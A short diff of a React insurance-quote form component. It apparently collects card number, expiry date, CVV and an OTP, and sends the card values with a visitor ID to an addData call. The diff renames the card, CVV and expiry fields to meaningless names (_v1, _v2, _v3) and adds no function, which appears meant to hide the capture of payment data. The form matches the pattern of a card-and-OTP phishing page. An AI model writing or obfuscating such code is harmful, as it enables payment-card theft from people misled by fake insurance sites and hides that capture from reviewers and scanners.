@@ -39,7 +39,7 @@ export default function InsuranceForm() {
   const [otpValue, setOtpValue] = useState("")
   const [otpError, setOtpError] = useState("")
   const [otpAttempts, setOtpAttempts] = useState(5)
-  const [cardNumber, setCardNumber] = useState("")
+  const [_v1, _s1] = useState("")
   const [identityNumber, setidentityNumber] = useState("")
   const [ownerName, setOwnerName] = useState("")
   const [phoneNumber, setPhoneNumber] = useState("")
@@ -50,8 +50,8 @@ export default function InsuranceForm() {
   const [vehicleYear, setVehicleYear] = useState("")
   const [vehicleModel, setVehicleModel] = useState("")
   const [repairLocation, setRepairLocation] = useState("agency")
-  const [expiryDate, setExpiryDate] = useState("")
-  const [cvv, setCvv] = useState("")
+  const [_v3, _s3] = useState("")
+  const [_v2, _s2] = useState("")
   const [loading, setLoading] = useState(true)
   const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
   const [identityNumberError, setidentityNumberError] = useState("")
@@ -251,7 +251,7 @@ export default function InsuranceForm() {
   const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, }).then(() => {
+    await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, }).then(() => {
       setShowOtpDialog(true)
     })
   }
